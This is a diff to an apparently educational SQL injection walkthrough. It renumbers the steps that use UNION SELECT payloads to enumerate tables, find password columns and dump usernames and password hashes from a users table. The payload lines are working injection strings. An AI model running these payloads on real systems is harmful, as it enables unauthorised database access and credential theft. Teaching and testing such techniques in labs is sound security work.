@@ -69,28 +69,28 @@ We retrieve the current database name using the UNION SELECT method.
 ```
 <img width="602" height="281" alt="image" src="https://github.com/user-attachments/assets/3c1e0907-8988-49be-b51b-8cce79514d15" />
 
-## Step 4: Listing Tables in the Database
+## Step 5: Listing Tables in the Database
 We query the information_schema.tables to find all table names.
 ``` sql
 ' UNION SELECT 1,2,3,4,table_name,6,7 FROM information_schema.tables --
 ```
 <img width="602" height="250" alt="image" src="https://github.com/user-attachments/assets/b4d92949-b5f0-4213-a288-46addac09430" />
 
-## Step 5: Retrieving details Columns of containing passwords
+## Step 6: Retrieving details Columns of containing passwords
 Once we identify a list of tables, we try to find tables containing sensitive data like passwords.
 ``` sql
 ' UNION SELECT 1,2,3,4,table_name,6,7 FROM information_schema.columns where column_name="password" --
 ```
 <img width="602" height="250" alt="image" src="https://github.com/user-attachments/assets/ddca7422-cfe6-4e75-9947-9cb76f8533b5" />
 
-## Step 5: Retrieving Columns of a Target Table
+## Step 7: Retrieving Columns of a Target Table
 Once we identify a table of interest (e.g., users), we list its columns.
 ``` sql
 ' UNION SELECT 1,2,3,4,column_name,6,7 FROM information_schema.columns where table_name="users" --
 ```
 <img width="602" height="249" alt="image" src="https://github.com/user-attachments/assets/9af4cd97-af11-4807-bb28-bb9bbf133cf4" />
 
-Step 6: Extracting Usernames & Password Hashes
+## Step 8: Extracting Usernames & Password Hashes
 Now we dump data from the target table.
 ```sql
 ' UNION SELECT 1,login,3,4,password,6,7 FROM users --
